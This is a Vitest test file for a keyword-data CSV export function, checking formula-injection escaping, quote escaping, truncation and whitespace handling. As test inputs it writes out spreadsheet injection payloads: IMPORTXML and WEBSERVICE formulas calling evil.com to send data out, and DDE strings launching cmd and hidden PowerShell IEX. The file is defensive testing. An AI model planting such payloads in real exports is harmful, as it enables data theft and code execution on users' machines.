import { describe, it, expect, vi, beforeEach } from 'vitest'
import { exportToCSV } from '@/lib/utils/csv-export'
import type { KeywordData } from '@/types/keyword'

// Mock DOM APIs for testing
global.document = {
  createElement: vi.fn(() => ({
    setAttribute: vi.fn(),
    style: { visibility: '' },
    click: vi.fn(),
  })),
  body: {
    appendChild: vi.fn(),
    removeChild: vi.fn(),
  },
} as any

global.URL = {
  createObjectURL: vi.fn(() => 'blob:mock-url'),
  revokeObjectURL: vi.fn(),
} as any

global.Blob = vi.fn() as any

describe('CSV Export Security', () => {
  let mockKeywordData: KeywordData[]

  beforeEach(() => {
    vi.clearAllMocks()

    // Base test data
    mockKeywordData = [
      {
        keyword: 'safe keyword',
        searchVolume: 1000,
        difficulty: 50,
        cpc: 1.25,
        competition: 'medium',
        intent: 'informational',
      },
    ]
  })

  describe('Formula Injection Prevention', () => {
    it('escapes formulas starting with equals sign', () => {
      const dangerousKeyword: KeywordData = {
        ...mockKeywordData[0],
        keyword: '=IMPORTXML("http://evil.com/steal-data","//data")',
      }

      exportToCSV([dangerousKeyword])

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      // Should be prefixed with single quote to prevent formula execution
      expect(csvContent).toContain(`"'=IMPORTXML("`) // Check escaped format
      expect(csvContent).toContain('http://evil.com/steal-data') // Content preserved
      // Raw formula at start should not appear (it should be escaped)
      expect(csvContent).not.toMatch(/^[^"']*=IMPORTXML/) // No unescaped formula at start
    })

    it('escapes formulas starting with plus sign', () => {
      const dangerousKeyword: KeywordData = {
        ...mockKeywordData[0],
        keyword: '+WEBSERVICE("http://evil.com/exfiltrate")',
      }

      exportToCSV([dangerousKeyword])

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      expect(csvContent).toContain(`"'+WEBSERVICE("`)
      expect(csvContent).toContain('http://evil.com/exfiltrate')
    })

    it('escapes formulas starting with minus sign', () => {
      const dangerousKeyword: KeywordData = {
        ...mockKeywordData[0],
        keyword: '-SUM(1+1)*CMD|"/c calc"!A0',
      }

      exportToCSV([dangerousKeyword])

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      expect(csvContent).toContain(`"'-SUM(1+1)*CMD|"`) // Escaped formula start
      expect(csvContent).toContain('/c calc') // Content preserved
    })

    it('escapes formulas starting with at symbol', () => {
      const dangerousKeyword: KeywordData = {
        ...mockKeywordData[0],
        keyword: '@SUM(1+9)*cmd|" /C calc"|!A0',
      }

      exportToCSV([dangerousKeyword])

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      expect(csvContent).toContain(`"'@SUM(1+9)*cmd|"`) // Escaped formula start
      expect(csvContent).toContain(' /C calc') // Content preserved
    })

    it('escapes formulas starting with tab character', () => {
      const dangerousKeyword: KeywordData = {
        ...mockKeywordData[0],
        keyword: '\t=cmd|"/c powershell IEX"',
      }

      exportToCSV([dangerousKeyword])

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      expect(csvContent).toContain(`"'=cmd|"`) // Tab should be escaped, formula start prevented
      expect(csvContent).toContain('/c powershell IEX') // Content preserved
    })
  })

  describe('Quote Escaping', () => {
    it('properly escapes double quotes in keywords', () => {
      const keywordWithQuotes: KeywordData = {
        ...mockKeywordData[0],
        keyword: 'keyword with "quoted" text',
      }

      exportToCSV([keywordWithQuotes])

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      // Double quotes should be escaped as ""
      expect(csvContent).toContain(`"keyword with ""quoted"" text"`)
    })

    it('escapes quotes in competition field', () => {
      const dataWithQuotes: KeywordData = {
        ...mockKeywordData[0],
        competition: 'high "competitive"',
      }

      exportToCSV([dataWithQuotes])

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      expect(csvContent).toContain(`"high ""competitive"""`)
    })
  })

  describe('Length Limits', () => {
    it('truncates extremely long keywords', () => {
      const veryLongKeyword = 'a'.repeat(40000) // Exceeds Excel's 32767 limit
      const longKeywordData: KeywordData = {
        ...mockKeywordData[0],
        keyword: veryLongKeyword,
      }

      exportToCSV([longKeywordData])

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      // Should be truncated with ellipsis
      expect(csvContent).toContain('...')
      expect(csvContent.length).toBeLessThan(veryLongKeyword.length + 1000)
    })
  })

  describe('Whitespace Handling', () => {
    it('trims leading and trailing whitespace', () => {
      const keywordWithWhitespace: KeywordData = {
        ...mockKeywordData[0],
        keyword: '   keyword with spaces   ',
      }

      exportToCSV([keywordWithWhitespace])

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      expect(csvContent).toContain(`"keyword with spaces"`)
      expect(csvContent).not.toContain('   keyword with spaces   ')
    })

    it('handles newlines and carriage returns safely', () => {
      const keywordWithNewlines: KeywordData = {
        ...mockKeywordData[0],
        keyword: '\nkeyword\rwith\r\nnewlines',
      }

      exportToCSV([keywordWithNewlines])

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      // Leading/trailing newlines are trimmed, but internal newlines preserved
      expect(csvContent).toContain('keyword') // Content preserved
      expect(csvContent).toContain('newlines') // Content preserved
      // The main security concern is that it doesn't start with dangerous characters
      // Since trim() removes leading newlines, this content is safe
    })
  })

  describe('Edge Cases', () => {
    it('handles empty keywords safely', () => {
      const emptyKeywordData: KeywordData = {
        ...mockKeywordData[0],
        keyword: '',
      }

      exportToCSV([emptyKeywordData])

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      expect(csvContent).toContain('""') // Should result in empty quoted string
    })

    it('handles keywords with only dangerous characters', () => {
      const dangerousOnly: KeywordData = {
        ...mockKeywordData[0],
        keyword: '=',
      }

      exportToCSV([dangerousOnly])

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      expect(csvContent).toContain(`"'="`) // Should be escaped
    })

    it('handles mixed safe and dangerous content', () => {
      const mixedData: KeywordData[] = [
        {
          ...mockKeywordData[0],
          keyword: 'safe keyword',
        },
        {
          ...mockKeywordData[0],
          keyword: '=DANGEROUS_FORMULA()',
        },
        {
          ...mockKeywordData[0],
          keyword: 'another safe keyword',
        },
      ]

      exportToCSV(mixedData)

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      // Safe keywords should remain unchanged
      expect(csvContent).toContain(`"safe keyword"`)
      expect(csvContent).toContain(`"another safe keyword"`)

      // Dangerous keyword should be escaped
      expect(csvContent).toContain(`"'=DANGEROUS_FORMULA()"`)
    })
  })

  describe('Real-world Attack Vectors', () => {
    it('prevents Excel DDE injection', () => {
      const ddeInjection: KeywordData = {
        ...mockKeywordData[0],
        keyword:
          '=cmd|"/c powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX"',
      }

      exportToCSV([ddeInjection])

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      expect(csvContent).toContain(`"'=cmd|"`) // Formula escaped
      expect(csvContent).toContain('powershell.exe') // Content preserved
    })

    it('prevents Google Sheets IMPORTXML injection', () => {
      const importXmlInjection: KeywordData = {
        ...mockKeywordData[0],
        keyword: '=IMPORTXML("https://evil.com/","//script")',
      }

      exportToCSV([importXmlInjection])

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      expect(csvContent).toContain(`"'=IMPORTXML("`) // Formula escaped
      expect(csvContent).toContain('https://evil.com/') // Content preserved
    })

    it('prevents hyperlink injection', () => {
      const hyperlinkInjection: KeywordData = {
        ...mockKeywordData[0],
        keyword: '=HYPERLINK("http://evil.com","Click here")',
      }

      exportToCSV([hyperlinkInjection])

      const blobCall = vi.mocked(global.Blob).mock.calls[0]
      const csvContent = blobCall[0][0]

      expect(csvContent).toContain(`"'=HYPERLINK("`) // Formula escaped
      expect(csvContent).toContain('http://evil.com') // Content preserved
    })
  })
})
